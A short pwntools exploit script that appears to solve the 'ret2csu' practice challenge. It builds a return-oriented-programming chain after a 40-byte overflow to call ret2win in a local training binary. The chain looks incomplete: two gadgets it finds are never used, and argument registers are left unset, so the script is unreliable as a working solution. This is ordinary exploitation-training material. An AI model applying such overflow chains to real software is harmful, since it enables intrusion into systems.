from pwn import *

elf = context.binary = ELF('./ret2csu')

rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
print(hex(pop_rdi))
pop_rsi = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
mov_rdx_r15 = 0x0000000000400680
pop_r15 = 0x00000000004006a2

offset = 40

rop.raw(b'A' * offset)
rop.raw(pop_r15)
rop.raw(0xdeadcafebabebeef)
rop.raw(mov_rdx_r15)
rop.raw(elf.plt.ret2win)

p = process()

print(rop.dump())

p.sendafter('>', rop.chain())
print(p.recvall())
